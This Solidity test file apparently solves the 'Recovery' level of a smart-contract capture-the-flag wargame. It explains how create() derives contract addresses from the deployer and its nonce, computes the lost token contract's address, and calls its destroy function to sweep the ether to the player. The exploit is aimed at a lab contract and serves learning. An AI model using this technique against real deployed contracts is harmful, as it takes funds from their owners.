// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Recovery.sol";
import "src/levels/RecoveryFactory.sol";

contract TestRecovery is BaseTest {
    Recovery private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new RecoveryFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Recovery(levelAddress);

        // Check that the contract is correctly setup
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // To find the lost address, we need to understand how the creation of contracts works via create()
        // EOAs and contracts can create new contracts using the create() opcode. The address of new contract is still determenistic. It is equal to the rightmost 160 bits of the keccak256 hash of RLP encoding of the sender's address and the nonce of the sender.
        // For EOAs, the nonce is increment with every transaction and starts with 0. For smart contracts, the nonce changes only with contract creations and starts with 1.
        // Using this knowledge, we can calculate the lost address by hashing the address of the Recovery contract and the nonce it used when deployng the SimpleToken contract.

        vm.prank(player, player);

        // Get the nonce of the Recovery contract
        uint8 nonce = uint8(vm.getNonce(address(level)) - 1);

        // Calculate the lost address
        address lostAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(nonce)))))
        );

        // Call the destroy function of the SimpleToken contract
        lostAddress.call(abi.encodeWithSignature("destroy(address)", player));
    }
}
